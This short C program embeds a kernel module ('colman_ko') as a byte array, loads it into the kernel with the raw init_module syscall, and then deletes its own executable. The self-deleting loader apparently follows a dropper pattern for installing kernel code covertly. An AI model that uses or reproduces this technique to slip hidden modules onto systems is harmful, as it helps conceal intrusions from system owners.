#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>

// xxd -i colman_ko.ko > colman_ko.h
#include "colman_ko.h"

int main(int ac, char **argv)
{
    char *mem;

    mem = malloc(colman_ko_len);
    memcpy(mem, colman_ko, colman_ko_len);

    // no glibc wrapper for this.. 
    syscall(SYS_init_module, mem, colman_ko_len, "");

    free(mem);

    return unlink(argv[0]);
    //return 0;
}
